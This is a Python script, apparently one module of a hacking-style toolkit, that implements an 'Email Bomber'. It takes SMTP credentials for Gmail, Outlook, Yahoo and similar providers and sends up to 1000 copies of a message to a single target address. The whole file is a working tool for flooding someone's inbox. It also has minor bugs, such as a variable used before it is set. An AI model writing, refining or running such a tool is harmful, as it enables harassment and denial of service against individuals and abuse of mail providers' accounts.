"""Email Bomber — Bulk email sender via SMTP."""

import os
import sys
import time
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

SMTP_SERVERS = {
    'gmail': ('smtp.gmail.com', 587),
    'outlook': ('smtp.office365.com', 587),
    'yahoo': ('smtp.mail.yahoo.com', 587),
    'protonmail': ('smtp.protonmail.com', 587),
    'aol': ('smtp.aol.com', 587),
    'zoho': ('smtp.zoho.com', 587),
    'icloud': ('smtp.mail.me.com', 587),
    'custom': ('', 587),
}

def _send_one(server, port, email, password, to, subject, body, use_tls=True):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = to
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))
    ctx = ssl.create_default_context()
    with smtplib.SMTP(server, port, timeout=10) as s:
        if use_tls:
            s.starttls(context=ctx)
        s.login(email, password)
        s.sendmail(email, to, msg.as_string())

def run(kevbin=None):
    while True:
        clear()
        cprint("  \033[93m╔══════════════════════════════════════════════╗\033[0m")
        cprint("  \033[93m║            EMAIL BOMBER                     ║\033[0m")
        cprint("  \033[93m╚══════════════════════════════════════════════╝\033[0m")
        print()
        cprint("  \033[97m[1]  Configure SMTP\033[0m")
        cprint("  \033[97m[2]  Send Emails\033[0m")
        cprint("  \033[97m[3]  Test Single Send\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '1':
            clear()
            cprint("  \033[93m┌── SMTP CONFIG ─────────────────────────────┐\033[0m")
            cprint("  \033[90mProvider: gmail, outlook, yahoo, protonmail, aol, zoho, icloud, custom\033[0m")
            provider = prompt("  \033[96mProvider: \033[0m").strip().lower()
            if provider not in SMTP_SERVERS:
                cprint("  \033[91m[X] Unknown provider\033[0m"); pause(); continue
            smtp_host, smtp_port = SMTP_SERVERS[provider]
            if provider == 'custom':
                smtp_host = prompt("  \033[96mSMTP Host: \033[0m").strip()
                try:
                    smtp_port = int(prompt("  \033[96mSMTP Port (587): \033[0m").strip() or '587')
                except:
                    smtp_port = 587
            sender = prompt("  \033[96mEmail: \033[0m").strip()
            password = prompt("  \033[96mPassword/App Password: \033[0m").strip()
            cprint(f"  \033[92m[X] Config: {smtp_host}:{smtp_port}\033[0m")
            time.sleep(0.5)
        elif choice == '2':
            if not smtp_host:
                cprint("  \033[91m[X] Configure SMTP first\033[0m"); pause(); continue
            clear()
            cprint("  \033[93m┌── SEND EMAILS ─────────────────────────────┐\033[0m")
            target = prompt("  \033[96mTarget email: \033[0m").strip()
            subject = prompt("  \033[96mSubject: \033[0m").strip() or "Hello"
            body = prompt("  \033[96mBody (HTML allowed): \033[0m").strip() or "Hello"
            try:
                count = int(prompt("  \033[96mCount (1-1000): \033[0m").strip() or '10')
            except:
                count = 10
            count = max(1, min(1000, count))
            try:
                delay = float(prompt("  \033[96mDelay seconds (0.5-30): \033[0m").strip() or '2')
            except:
                delay = 2
            delay = max(0.5, min(30, delay))
            cprint(f"\n  \033[36m[*] Sending {count} emails to {target}...\033[0m\n")
            success = 0
            fail = 0
            for i in range(count):
                try:
                    _send_one(smtp_host, smtp_port, sender, password, target, subject, body)
                    success += 1
                    bar_len = 30
                    filled = int(bar_len * (i + 1) / count)
                    bar = "\033[92m" + "\u2588" * filled + "\033[90m" + "\u2591" * (bar_len - filled) + "\033[0m"
                    sys.stdout.write(f"\r  [{bar}] \033[97m{i+1}/{count}\033[0m \033[92mOK:{success}\033[0m \033[91mFAIL:{fail}\033[0m")
                    sys.stdout.flush()
                except Exception as e:
                    fail += 1
                    sys.stdout.write(f"\r  \033[91m[X] {i+1}/{count} Error: {str(e)[:40]}\033[0m                \n")
                    sys.stdout.flush()
                    if 'Authentication' in str(e) or 'Login' in str(e):
                        cprint("  \033[91m[X] Auth failed — check credentials\033[0m")
                        break
                if delay > 0 and i < count - 1:
                    time.sleep(delay)
            cprint(f"\n\n  \033[92m[X] Done: {success} sent, {fail} failed\033[0m")
        elif choice == '3':
            if not smtp_host:
                cprint("  \033[91m[X] Configure SMTP first\033[0m"); pause(); continue
            target = prompt("  \033[96mTarget email: \033[0m").strip()
            subject = prompt("  \033[96mSubject: \033[0m").strip() or "Test"
            body = prompt("  \033[96mBody: \033[0m").strip() or "Test email from KevTool"
            try:
                _send_one(smtp_host, smtp_port, sender, password, target, subject, body)
                cprint("  \033[92m[X] Test email sent!\033[0m")
            except Exception as e:
                cprint(f"  \033[91m[X] Error: {e}\033[0m")
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
